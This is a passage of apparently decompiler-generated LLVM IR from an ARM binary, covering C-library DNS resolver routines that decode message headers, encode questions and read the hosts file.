  %v1_170b4 = add i32 %v0_170b4, 45
  %v2_170b4 = inttoptr i32 %v1_170b4 to i8*
  %v3_170b4 = load i8, i8* %v2_170b4, align 1
  %v2_170b8 = load i32, i32* %lr.global-to-local, align 4
  %v3_170b8 = add i32 %v2_170b8, 10
  %v4_170b8 = inttoptr i32 %v3_170b8 to i8*
  store i8 %v3_170b4, i8* %v4_170b8, align 1
  %v0_170bc = load i32, i32* @ip, align 4
  %v1_170bc = add i32 %v0_170bc, 44
  %v2_170bc = inttoptr i32 %v1_170bc to i32*
  %v3_170bc = load i32, i32* %v2_170bc, align 4
  %v1_170c0 = trunc i32 %v3_170bc to i8
  %v2_170c0 = load i32, i32* %lr.global-to-local, align 4
  %v3_170c0 = add i32 %v2_170c0, 11
  %v4_170c0 = inttoptr i32 %v3_170c0 to i8*
  store i8 %v1_170c0, i8* %v4_170c0, align 1
  %v2_170c8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_170c8

dec_label_pc_170c8:                               ; preds = %entry, %bb17
  %v2_170c8 = phi i32 [ %v2_170c8.pre, %bb17 ], [ %v0_16fe8, %entry ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %entry ]
  store i32 %v2_170c8, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1700c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 45, { 1, 2, 0, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_170c8, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_170d0 = load i8, i8* %arg1, align 1
  %v4_170d0 = zext i8 %v3_170d0 to i32
  %v2_170d4 = add i32 %tmp, 1
  %v3_170d4 = inttoptr i32 %v2_170d4 to i8*
  %v4_170d4 = load i8, i8* %v3_170d4, align 1
  %v5_170d4 = zext i8 %v4_170d4 to i32
  %v4_170d8 = mul nuw nsw i32 %v4_170d0, 256
  %v5_170d8 = or i32 %v5_170d4, %v4_170d8
  %v2_170dc = inttoptr i32 %arg2 to i32*
  store i32 %v5_170d8, i32* %v2_170dc, align 4
  %v2_170e0 = add i32 %tmp, 2
  %v3_170e0 = inttoptr i32 %v2_170e0 to i8*
  %v4_170e0 = load i8, i8* %v3_170e0, align 1
  %tmp3 = icmp slt i8 %v4_170e0, 0
  %v3_170e4 = zext i1 %tmp3 to i32
  %v2_170e8 = add i32 %arg2, 4
  %v3_170e8 = inttoptr i32 %v2_170e8 to i32*
  store i32 %v3_170e4, i32* %v3_170e8, align 4
  %v4_170ec = load i8, i8* %v3_170e0, align 1
  %div = udiv i8 %v4_170ec, 8
  %tmp4 = urem i8 %div, 16
  %v1_170f4 = zext i8 %tmp4 to i32
  %v2_170f8 = add i32 %arg2, 8
  %v3_170f8 = inttoptr i32 %v2_170f8 to i32*
  store i32 %v1_170f4, i32* %v3_170f8, align 4
  %v4_170fc = load i8, i8* %v3_170e0, align 1
  %div1 = udiv i8 %v4_170fc, 4
  %tmp5 = urem i8 %div1, 2
  %v1_17104 = zext i8 %tmp5 to i32
  %v2_17108 = add i32 %arg2, 12
  %v3_17108 = inttoptr i32 %v2_17108 to i32*
  store i32 %v1_17104, i32* %v3_17108, align 4
  %v4_1710c = load i8, i8* %v3_170e0, align 1
  %div2 = udiv i8 %v4_1710c, 2
  %tmp6 = urem i8 %div2, 2
  %v1_17114 = zext i8 %tmp6 to i32
  %v2_17118 = add i32 %arg2, 16
  %v3_17118 = inttoptr i32 %v2_17118 to i32*
  store i32 %v1_17114, i32* %v3_17118, align 4
  %v4_1711c = load i8, i8* %v3_170e0, align 1
  %tmp7 = urem i8 %v4_1711c, 2
  %v1_17120 = zext i8 %tmp7 to i32
  %v2_17124 = add i32 %arg2, 20
  %v3_17124 = inttoptr i32 %v2_17124 to i32*
  store i32 %v1_17120, i32* %v3_17124, align 4
  %v2_17128 = add i32 %tmp, 3
  %v3_17128 = inttoptr i32 %v2_17128 to i8*
  %v4_17128 = load i8, i8* %v3_17128, align 1
  %tmp8 = icmp slt i8 %v4_17128, 0
  %v3_1712c = zext i1 %tmp8 to i32
  %v2_17130 = add i32 %arg2, 24
  %v3_17130 = inttoptr i32 %v2_17130 to i32*
  store i32 %v3_1712c, i32* %v3_17130, align 4
  %v4_17134 = load i8, i8* %v3_17128, align 1
  %tmp9 = urem i8 %v4_17134, 16
  %v1_17138 = zext i8 %tmp9 to i32
  %v2_1713c = add i32 %arg2, 28
  %v3_1713c = inttoptr i32 %v2_1713c to i32*
  store i32 %v1_17138, i32* %v3_1713c, align 4
  %v2_17140 = add i32 %tmp, 4
  %v3_17140 = inttoptr i32 %v2_17140 to i8*
  %v4_17140 = load i8, i8* %v3_17140, align 1
  %v5_17140 = zext i8 %v4_17140 to i32
  %v2_17144 = add i32 %tmp, 5
  %v3_17144 = inttoptr i32 %v2_17144 to i8*
  %v4_17144 = load i8, i8* %v3_17144, align 1
  %v5_17144 = zext i8 %v4_17144 to i32
  %v4_17148 = mul nuw nsw i32 %v5_17140, 256
  %v5_17148 = or i32 %v5_17144, %v4_17148
  %v2_1714c = add i32 %arg2, 32
  %v3_1714c = inttoptr i32 %v2_1714c to i32*
  store i32 %v5_17148, i32* %v3_1714c, align 4
  %v2_17150 = add i32 %tmp, 6
  %v3_17150 = inttoptr i32 %v2_17150 to i8*
  %v4_17150 = load i8, i8* %v3_17150, align 1
  %v5_17150 = zext i8 %v4_17150 to i32
  %v2_17154 = add i32 %tmp, 7
  %v3_17154 = inttoptr i32 %v2_17154 to i8*
  %v4_17154 = load i8, i8* %v3_17154, align 1
  %v5_17154 = zext i8 %v4_17154 to i32
  %v4_17158 = mul nuw nsw i32 %v5_17150, 256
  %v5_17158 = or i32 %v5_17154, %v4_17158
  %v2_1715c = add i32 %arg2, 36
  %v3_1715c = inttoptr i32 %v2_1715c to i32*
  store i32 %v5_17158, i32* %v3_1715c, align 4
  %v2_17160 = add i32 %tmp, 8
  %v3_17160 = inttoptr i32 %v2_17160 to i8*
  %v4_17160 = load i8, i8* %v3_17160, align 1
  %v5_17160 = zext i8 %v4_17160 to i32
  %v2_17164 = add i32 %tmp, 9
  %v3_17164 = inttoptr i32 %v2_17164 to i8*
  %v4_17164 = load i8, i8* %v3_17164, align 1
  %v5_17164 = zext i8 %v4_17164 to i32
  %v4_17168 = mul nuw nsw i32 %v5_17160, 256
  %v5_17168 = or i32 %v5_17164, %v4_17168
  %v2_1716c = add i32 %arg2, 40
  %v3_1716c = inttoptr i32 %v2_1716c to i32*
  store i32 %v5_17168, i32* %v3_1716c, align 4
  %v2_17170 = add i32 %tmp, 11
  %v3_17170 = inttoptr i32 %v2_17170 to i8*
  %v4_17170 = load i8, i8* %v3_17170, align 1
  %v5_17170 = zext i8 %v4_17170 to i32
  %v2_17174 = add i32 %tmp, 10
  %v3_17174 = inttoptr i32 %v2_17174 to i8*
  %v4_17174 = load i8, i8* %v3_17174, align 1
  %v5_17174 = zext i8 %v4_17174 to i32
  %v4_17178 = mul nuw nsw i32 %v5_17174, 256
  %v5_17178 = or i32 %v4_17178, %v5_17170
  %v2_1717c = add i32 %arg2, 44
  %v3_1717c = inttoptr i32 %v2_1717c to i32*
  store i32 %v5_17178, i32* %v3_1717c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 11, { 10, 11, 4, 5, 7, 8, 9, 14, 12, 13, 15, 1, 2, 3, 16, 17, 18, 19, 20, 21, 0, 6 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5, 12 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17184 = load i32, i32* @r4, align 4
  store i32 %v3_17184, i32* %stack_var_-16, align 4
  %v9_17184 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_1718c = load i32, i32* %arg1, align 4
  store i32 %v2_1718c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_17198 = inttoptr i32 %v2_1718c to i8*
  %v2_17198 = call i32 @__encode_dotted(i8* %v1_17198)
  store i32 %v2_17198, i32* %r0.global-to-local, align 4
  %v1_1719c = icmp slt i32 %v2_17198, 0
  br i1 %v1_1719c, label %dec_label_pc_171dc, label %dec_label_pc_171a4

dec_label_pc_171a4:                               ; preds = %entry
  %v1_171a4 = load i32, i32* @r5, align 4
  %v2_171a4 = sub i32 %v1_171a4, %v2_17198
  %v7_171ac = icmp slt i32 %v2_171a4, 4
  br i1 %v7_171ac, label %bb, label %dec_label_pc_171b4

bb:                                               ; preds = %dec_label_pc_171a4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_171dc

dec_label_pc_171b4:                               ; preds = %dec_label_pc_171a4
  %v0_171b4 = load i32, i32* @r4, align 4
  %v1_171b4 = add i32 %v0_171b4, 5
  %v2_171b4 = inttoptr i32 %v1_171b4 to i8*
  %v3_171b4 = load i8, i8* %v2_171b4, align 1
  %v2_171b8 = load i32, i32* @r6, align 4
  %v4_171b8 = add i32 %v2_171b8, %v2_17198
  %v5_171b8 = inttoptr i32 %v4_171b8 to i8*
  store i8 %v3_171b4, i8* %v5_171b8, align 1
  %v0_171bc = load i32, i32* @r4, align 4
  %v1_171bc = add i32 %v0_171bc, 4
  %v2_171bc = inttoptr i32 %v1_171bc to i32*
  %v3_171bc = load i32, i32* %v2_171bc, align 4
  %v0_171c0 = load i32, i32* @r6, align 4
  %v1_171c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_171c0 = add i32 %v1_171c0, %v0_171c0
  store i32 %v2_171c0, i32* %r2.global-to-local, align 4
  %v1_171c4 = trunc i32 %v3_171bc to i8
  %v3_171c4 = add i32 %v2_171c0, 1
  %v4_171c4 = inttoptr i32 %v3_171c4 to i8*
  store i8 %v1_171c4, i8* %v4_171c4, align 1
  %v0_171c8 = load i32, i32* @r4, align 4
  %v1_171c8 = add i32 %v0_171c8, 9
  %v2_171c8 = inttoptr i32 %v1_171c8 to i8*
  %v3_171c8 = load i8, i8* %v2_171c8, align 1
  %v2_171cc = load i32, i32* %r2.global-to-local, align 4
  %v3_171cc = add i32 %v2_171cc, 2
  %v4_171cc = inttoptr i32 %v3_171cc to i8*
  store i8 %v3_171c8, i8* %v4_171cc, align 1
  %v0_171d0 = load i32, i32* @r4, align 4
  %v1_171d0 = add i32 %v0_171d0, 8
  %v2_171d0 = inttoptr i32 %v1_171d0 to i32*
  %v3_171d0 = load i32, i32* %v2_171d0, align 4
  %v1_171d4 = trunc i32 %v3_171d0 to i8
  %v2_171d4 = load i32, i32* %r2.global-to-local, align 4
  %v3_171d4 = add i32 %v2_171d4, 3
  %v4_171d4 = inttoptr i32 %v3_171d4 to i8*
  store i8 %v1_171d4, i8* %v4_171d4, align 1
  %v0_171d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_171d8 = add i32 %v0_171d8, 4
  store i32 %v1_171d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_171dc

dec_label_pc_171dc:                               ; preds = %bb, %entry, %dec_label_pc_171b4
  %v1_171e0 = phi i32 [ -1, %bb ], [ %v2_17198, %entry ], [ %v1_171d8, %dec_label_pc_171b4 ]
  %v2_171dc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_171dc, i32* @r4, align 4
  store i32 %v9_17184, i32* @r6, align 4
  ret i32 %v1_171e0

; uselistorder directives
  uselistorder i32 %v2_17198, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder label %dec_label_pc_171dc, { 2, 0, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33112), i32* @r0, align 4
  %v1_171fc = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33112))
  ret i32 %v1_171fc

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 0, 2, 1 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_17214 = load i32, i32* @r4, align 4
  %v9_17214 = load i32, i32* @r6, align 4
  %v12_17214 = load i32, i32* @r7, align 4
  %v15_17214 = load i32, i32* @r8, align 4
  %v18_17214 = load i32, i32* @sb, align 4
  %v24_17214 = load i32, i32* @fp, align 4
  store i32 %tmp10, i32* @r5, align 4
  store i32 %tmp9, i32* @lr, align 4
  store i32 -1, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r4, align 4
  %v2_17234 = inttoptr i32 %tmp9 to i32*
  store i32 -1, i32* %v2_17234, align 4
  %v0_17238 = load i32, i32* @r0, align 4
  store i32 %v0_17238, i32* @r6, align 4
  %v0_1723c = load i32, i32* @r1, align 4
  %v0_17240 = load i32, i32* @r2, align 4
  store i32 %v0_17240, i32* @r8, align 4
  %v0_17244 = load i32, i32* @r3, align 4
  store i32 %v0_17244, i32* @fp, align 4
  %v3_17248 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_17248, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp10, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_17254

.thread:                                          ; preds = %entry
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_1740c

dec_label_pc_17254:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_17258 = icmp eq i32 %v0_17238, 0
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_17258, label %dec_label_pc_17264, label %dec_label_pc_1728c

dec_label_pc_17264:                               ; preds = %dec_label_pc_17254
  %v0_17264 = call i32 @__open_etc_hosts()
  store i32 %v0_17264, i32* @r6, align 4
  %v2_17268 = icmp eq i32 %v0_17264, 0
  br i1 %v2_17268, label %dec_label_pc_17270, label %dec_label_pc_1728c

dec_label_pc_17270:                               ; preds = %dec_label_pc_17264
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  store i32 48860, i32* %r3.global-to-local, align 4
  %v2_17278 = inttoptr i32 %tmp7 to i32*
  store i32 0, i32* %v2_17278, align 4
  %v0_1727c = call i32 @__aeabi_read_tp()
  %v3_17280 = load i16, i16* @global_var_23164.175, align 2
  %v4_17280 = sext i16 %v3_17280 to i32
  store i32 %v4_17280, i32* %r3.global-to-local, align 4
  %v2_17284 = add i32 %v4_17280, %v0_1727c
  %v3_17284 = inttoptr i32 %v2_17284 to i32*
  %v4_17284 = load i32, i32* %v3_17284, align 4
  store i32 %v4_17284, i32* @sb, align 4
  br label %dec_label_pc_1740c

dec_label_pc_1728c:                               ; preds = %dec_label_pc_17264, %dec_label_pc_17254
  %v1_172ac = phi i32 [ %v0_17264, %dec_label_pc_17264 ], [ %v0_17238, %dec_label_pc_17254 ]
  %v0_17290 = load i32, i32* @r4, align 4
  %v2_17290 = add i32 %v0_17290, -33100
  store i32 %v2_17290, i32* @r4, align 4
  %v2_17294 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp6, i32* %ip.global-to-local, align 4
  store i32 %tmp6, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_172ac = add i32 %v1_172ac, 8
  %v3_172ac = inttoptr i32 %v2_172ac to i32*
  store i32 48, i32* %v3_172ac, align 4
  store i32 %tmp9, i32* %r3.global-to-local, align 4
  %v0_172b4 = load i32, i32* @r5, align 4
  %v1_172b4 = add i32 %v0_172b4, -48
  %v0_172b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_172b8 = add i32 %v0_172b8, 24
  store i32 %v1_172b8, i32* @ip, align 4
  %v0_172bc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_172bc, i32* @sb, align 4
  %v0_172c0 = load i32, i32* @lr, align 4
  %v1_172c0 = add i32 %v0_172c0, 32
  store i32 %v1_172c0, i32* @sl, align 4
  %v1_172c4 = load i32, i32* @r6, align 4
  %v2_172c4 = add i32 %v1_172c4, 16
  %v3_172c4 = inttoptr i32 %v2_172c4 to i32*
  store i32 %v1_172b4, i32* %v3_172c4, align 4
  %v0_172c8 = load i32, i32* @r4, align 4
  %v0_172cc = load i32, i32* @ip, align 4
  store i32 %v0_172cc, i32* %stack_var_-64, align 4
  %v0_172d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_172d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_172d0 = inttoptr i32 %v1_172d0 to i32*
  store i32 %v0_172d0, i32* %v2_172d0, align 4
  %v0_172d4 = load i32, i32* @lr, align 4
  %v1_172d4 = load i32, i32* @r6, align 4
  %v2_172d4 = add i32 %v1_172d4, 4
  %v3_172d4 = inttoptr i32 %v2_172d4 to i32*
  store i32 %v0_172d4, i32* %v3_172d4, align 4
  %v2_17304 = inttoptr i32 %v0_1723c to i8*
  br label %dec_label_pc_173e0

dec_label_pc_172dc:                               ; preds = %dec_label_pc_173e0
  %v3_172dc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_172dc, i32* @r1, align 4
  %v0_172e0 = load i32, i32* @fp, align 4
  %v7_172e0 = icmp eq i32 %v0_172e0, 1
  %v1_172e4 = add i32 %v3_172dc, 4
  store i32 %v1_172e4, i32* @r5, align 4
  %v1_172e8 = load i32, i32* @r7, align 4
  %v2_172e8 = add i32 %v1_172e8, 4
  %v3_172e8 = inttoptr i32 %v2_172e8 to i32*
  store i32 %v1_172e4, i32* %v3_172e8, align 4
  br i1 %v7_172e0, label %dec_label_pc_1740c, label %dec_label_pc_172f0

dec_label_pc_172f0:                               ; preds = %dec_label_pc_172dc
  %v0_172f0 = load i32, i32* @fp, align 4
  %v7_172f0 = icmp eq i32 %v0_172f0, 2
  br i1 %v7_172f0, label %dec_label_pc_172fc, label %dec_label_pc_17330.preheader

dec_label_pc_17330.preheader:                     ; preds = %dec_label_pc_172f0
  br label %dec_label_pc_17314

dec_label_pc_172fc:                               ; preds = %dec_label_pc_172f0
  %v0_172fc = load i32, i32* @r1, align 4
  %v1_172fc = inttoptr i32 %v0_172fc to i32*
  %v2_172fc = load i32, i32* %v1_172fc, align 4
  store i32 %v2_172fc, i32* @r1, align 4
  %v3_17304 = call i32 @__GI_strcoll(i8* %v2_17304, i32 %v2_172fc)
  %v2_17308 = icmp eq i32 %v3_17304, 0
  br i1 %v2_17308, label %dec_label_pc_17340, label %dec_label_pc_173e0

dec_label_pc_17314:                               ; preds = %dec_label_pc_17330.preheader, %dec_label_pc_17330.backedge
  %v0_1731c = phi i32 [ 0, %dec_label_pc_17330.preheader ], [ %v0_17330.be, %dec_label_pc_17330.backedge ]
  %v0_17314 = load i32, i32* @r5, align 4
  %v4_17314 = mul i32 %v0_1731c, 4
  %v5_17314 = add i32 %v4_17314, %v0_17314
  %v6_17314 = inttoptr i32 %v5_17314 to i32*
  %v7_17314 = load i32, i32* %v6_17314, align 4
  store i32 %v7_17314, i32* %r3.global-to-local, align 4
  %v2_17318 = icmp eq i32 %v7_17314, 0
  %v1_1731c = add i32 %v0_1731c, 1
  store i32 %v1_1731c, i32* @r4, align 4
  br i1 %v2_17318, label %dec_label_pc_17330.backedge, label %dec_label_pc_17324

dec_label_pc_17330.backedge:                      ; preds = %dec_label_pc_17314, %dec_label_pc_17330thread-pre-split
  %v0_17330.be = phi i32 [ %v0_17330.pr, %dec_label_pc_17330thread-pre-split ], [ %v1_1731c, %dec_label_pc_17314 ]
  %v7_17338 = icmp sgt i32 %v0_17330.be, 3
  br i1 %v7_17338, label %dec_label_pc_173e0, label %dec_label_pc_17314

dec_label_pc_17324:                               ; preds = %dec_label_pc_17314
  %v3_17324 = call i32 @__GI_strcasecmp(i8* %v2_17304, i32 %v7_17314)
  %v2_17328 = icmp eq i32 %v3_17324, 0
  br i1 %v2_17328, label %dec_label_pc_17340, label %dec_label_pc_17330thread-pre-split

dec_label_pc_17330thread-pre-split:               ; preds = %dec_label_pc_17324
  %v0_17330.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_17330.backedge

dec_label_pc_17340:                               ; preds = %dec_label_pc_17324, %dec_label_pc_172fc
  %v0_17340 = load i32, i32* @r5, align 4
  %v1_17340 = inttoptr i32 %v0_17340 to i32*
  %v2_17340 = load i32, i32* %v1_17340, align 4
  store i32 %v2_17340, i32* %r3.global-to-local, align 4
  %v4_17340 = add i32 %v0_17340, 4
  store i32 %v4_17340, i32* @r5, align 4
  %v2_17344 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_17344, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_1734c = load i32, i32* @r7, align 4
  %v2_1734c = inttoptr i32 %v1_1734c to i32*
  store i32 %v2_17340, i32* %v2_1734c, align 4
  %v0_17350 = load i32, i32* @lr, align 4
  %v1_17350 = load i32, i32* @ip, align 4
  %v2_17350 = add i32 %v1_17350, 4
  %v3_17350 = inttoptr i32 %v2_17350 to i32*
  store i32 %v0_17350, i32* %v3_17350, align 4
  store i32 %tmp6, i32* %r2.global-to-local, align 4
  %v0_17358 = load i32, i32* @r8, align 4
  %v7_17358 = icmp eq i32 %v0_17358, 2
  %v0_1735c = load i32, i32* @r5, align 4
  %v1_1735c = load i32, i32* @r7, align 4
  %v2_1735c = add i32 %v1_1735c, 4
  %v3_1735c = inttoptr i32 %v2_1735c to i32*
  store i32 %v0_1735c, i32* %v3_1735c, align 4
  %v0_17360 = load i32, i32* @ip, align 4
  %v1_17360 = load i32, i32* @r7, align 4
  %v2_17360 = add i32 %v1_17360, 16
  %v3_17360 = inttoptr i32 %v2_17360 to i32*
  store i32 %v0_17360, i32* %v3_17360, align 4
  %v0_17364 = load i32, i32* @sl, align 4
  %v1_17364 = load i32, i32* %r2.global-to-local, align 4
  %v2_17364 = add i32 %v1_17364, 24
  %v3_17364 = inttoptr i32 %v2_17364 to i32*
  store i32 %v0_17364, i32* %v3_17364, align 4
  br i1 %v7_17358, label %dec_label_pc_1736c, label %dec_label_pc_1739c

dec_label_pc_1736c:                               ; preds = %dec_label_pc_17340
  %v3_1736c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1736c, i32* %r3.global-to-local, align 4
  %v0_17370 = load i32, i32* @r8, align 4
  %v1_17374 = inttoptr i32 %v3_1736c to i32*
  %v2_17374 = load i32, i32* %v1_17374, align 4
  %v0_17378 = load i32, i32* @sl, align 4
  store i32 %v0_17378, i32* %r2.global-to-local, align 4
  %v3_1737c = inttoptr i32 %v2_17374 to i8*
  %v4_1737c = call i32 @inet_pton(i32 %v0_17370, i8* %v3_1737c, i32 %v0_17378)
  %tmp23 = icmp slt i32 %v4_1737c, 1
  br i1 %tmp23, label %dec_label_pc_173dc, label %dec_label_pc_17388

dec_label_pc_17388:                               ; preds = %dec_label_pc_1736c
  %v0_1738c = load i32, i32* @r7, align 4
  %v2_1738c = inttoptr i32 %tmp7 to i32*
  store i32 %v0_1738c, i32* %v2_1738c, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_17394 = load i32, i32* @r8, align 4
  %v1_17394 = load i32, i32* @r7, align 4
  %v2_17394 = add i32 %v1_17394, 8
  %v3_17394 = inttoptr i32 %v2_17394 to i32*
  store i32 %v0_17394, i32* %v3_17394, align 4
  %v0_173d4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_173d0

dec_label_pc_1739c:                               ; preds = %dec_label_pc_17340
  %v0_1739c = load i32, i32* @r8, align 4
  %v7_1739c = icmp eq i32 %v0_1739c, 10
  br i1 %v7_1739c, label %dec_label_pc_173a4, label %dec_label_pc_173dc

dec_label_pc_173a4:                               ; preds = %dec_label_pc_1739c
  %v3_173a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_173a4, i32* %r3.global-to-local, align 4
  %v1_173ac = inttoptr i32 %v3_173a4 to i32*
  %v2_173ac = load i32, i32* %v1_173ac, align 4
  %v0_173b0 = load i32, i32* @sl, align 4
  store i32 %v0_173b0, i32* %r2.global-to-local, align 4
  %v3_173b4 = inttoptr i32 %v2_173ac to i8*
  %v4_173b4 = call i32 @inet_pton(i32 10, i8* %v3_173b4, i32 %v0_173b0)
  %tmp24 = icmp slt i32 %v4_173b4, 1
  br i1 %tmp24, label %dec_label_pc_173dc, label %dec_label_pc_173c0

dec_label_pc_173c0:                               ; preds = %dec_label_pc_173a4
  store i32 %tmp7, i32* @ip, align 4
  %v0_173c4 = load i32, i32* @r8, align 4
  %v1_173c4 = load i32, i32* @r7, align 4
  %v2_173c4 = add i32 %v1_173c4, 8
  %v3_173c4 = inttoptr i32 %v2_173c4 to i32*
  store i32 %v0_173c4, i32* %v3_173c4, align 4
  %v0_173c8 = load i32, i32* @r7, align 4
  %v1_173c8 = load i32, i32* @ip, align 4
  %v2_173c8 = inttoptr i32 %v1_173c8 to i32*
  store i32 %v0_173c8, i32* %v2_173c8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_173d0

dec_label_pc_173d0:                               ; preds = %dec_label_pc_17388, %dec_label_pc_173c0
  %v0_173d4 = phi i32 [ %v0_173d4.pre, %dec_label_pc_17388 ], [ 16, %dec_label_pc_173c0 ]
  store i32 0, i32* @sb, align 4
  %v1_173d4 = load i32, i32* @r7, align 4
  %v2_173d4 = add i32 %v1_173d4, 12
  %v3_173d4 = inttoptr i32 %v2_173d4 to i32*
  store i32 %v0_173d4, i32* %v3_173d4, align 4
  br label %dec_label_pc_17404

dec_label_pc_173dc:                               ; preds = %dec_label_pc_1739c, %dec_label_pc_173a4, %dec_label_pc_1736c
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_173e0

dec_label_pc_173e0:                               ; preds = %dec_label_pc_17330.backedge, %dec_label_pc_172fc, %dec_label_pc_173dc, %dec_label_pc_1728c
  %v0_173e0 = load i32, i32* @r6, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_172c8, i32* %r3.global-to-local, align 4
  %v4_173f0 = inttoptr i32 %v0_173e0 to i32*
  %v5_173f0 = call i32 @__GI_config_read(i32* %v4_173f0, i32 %v2_17294, i32 459270, i32 %v0_172c8)
  %v2_173f4 = icmp eq i32 %v5_173f0, 0
  br i1 %v2_173f4, label %dec_label_pc_173fc, label %dec_label_pc_172dc

dec_label_pc_173fc:                               ; preds = %dec_label_pc_173e0
  %v0_173fc = load i32, i32* @fp, align 4
  %v7_173fc = icmp eq i32 %v0_173fc, 1
  br i1 %v7_173fc, label %dec_label_pc_1740c, label %dec_label_pc_17404

dec_label_pc_17404:                               ; preds = %dec_label_pc_173fc, %dec_label_pc_173d0
  %v0_17404 = load i32, i32* @r6, align 4
  %v1_17408 = inttoptr i32 %v0_17404 to i32*
  %v2_17408 = call i32 @__GI_config_close(i32* %v1_17408)
  br label %dec_label_pc_1740c

dec_label_pc_1740c:                               ; preds = %dec_label_pc_172dc, %.thread, %dec_label_pc_173fc, %dec_label_pc_17270, %dec_label_pc_17404
  %v0_1740c = load i32, i32* @sb, align 4
  store i32 %v3_17214, i32* @r4, align 4
  store i32 %v9_17214, i32* @r6, align 4
  store i32 %v12_17214, i32* @r7, align 4
  store i32 %v15_17214, i32* @r8, align 4
  store i32 %v18_17214, i32* @sb, align 4
  store i32 %v24_17214, i32* @fp, align 4
  ret i32 %v0_1740c

; uselistorder directives
  uselistorder i32 %v0_17330.be, { 1, 0 }
  uselistorder i32 %v0_172c8, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 3, 2, 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32 (i32*)* @__GI_config_close, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 0, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 -48, { 1, 0, 2, 3, 4 }
  uselistorder i16 8, { 0, 1, 2, 5, 3, 4, 6 }
